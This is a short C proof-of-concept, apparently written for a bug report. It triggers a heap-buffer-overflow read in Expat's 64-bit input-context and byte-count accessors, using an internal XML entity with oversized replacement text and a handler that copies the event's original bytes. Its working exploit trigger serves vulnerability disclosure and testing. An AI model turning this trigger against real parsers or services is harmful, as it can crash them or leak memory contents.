/* Residual memory-safety PoC for the 64-bit location accessors.
 *
 * Reconstructs the "original string" of the current parse event using the
 * public API, exactly as documented for XML_GetInputContext() and
 * XML_GetCurrentByteCount(): the input context gives the buffer and the offset
 * of the event, and the byte count gives the number of bytes of the event, so
 * the event's original bytes are
 *
 *     memcpy(dst, context + offset, byte_count);
 *
 * (Perl XML::Parser's XML_OriginalString and Expat's own test helper
 * dup_original_string do exactly this.)
 *
 * The input is ordinary, well-formed XML; only the (valid) length of the
 * internal entity's replacement text is crafted.  On a correct implementation
 * the byte count of an event reached through an internal entity is the length
 * of the "&e;" reference that lives in the returned input buffer, so the copy
 * stays in bounds.  The shipped build instead reports the length of the token
 * inside the entity's separate, much larger replacement text while still
 * returning the main input buffer and an offset into it, so the copy runs off
 * the end of the input buffer (heap-buffer-overflow READ under ASan).
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "expat.h"

static XML_Parser g_parser;

static char *
dup_original_string(XML_Parser parser) {
  int64_t offset = -1;
  uint64_t size = 0;
  const char *const context = XML_GetInputContext64(parser, &offset, &size);
  const uint64_t byte_count = XML_GetCurrentByteCount64(parser);
  if (context == NULL)
    return NULL;
  char *const out = (char *)malloc((size_t)byte_count + 1);
  memcpy(out, context + offset, (size_t)byte_count);
  out[byte_count] = '\0';
  return out;
}

static void XMLCALL
on_characters(void *userData, const XML_Char *s, int len) {
  (void)userData;
  (void)s;
  (void)len;
  char *const original = dup_original_string(g_parser);
  free(original);
}

int
main(void) {
  const size_t value_len = 40000;
  char *const doc = (char *)malloc(value_len + 256);
  int p = 0;
  p += sprintf(doc + p, "<!DOCTYPE r [<!ENTITY e '");
  for (size_t i = 0; i < value_len; i++)
    doc[p++] = 'x';
  p += sprintf(doc + p, "'>]><r>&e;</r>");

  g_parser = XML_ParserCreate(NULL);
  XML_SetCharacterDataHandler(g_parser, on_characters);
  if (XML_Parse(g_parser, doc, p, 1) == XML_STATUS_ERROR)
    fprintf(stderr, "parse error: %s\n",
            XML_ErrorString(XML_GetErrorCode(g_parser)));
  XML_ParserFree(g_parser);
  free(doc);
  printf("done\n");
  return 0;
}
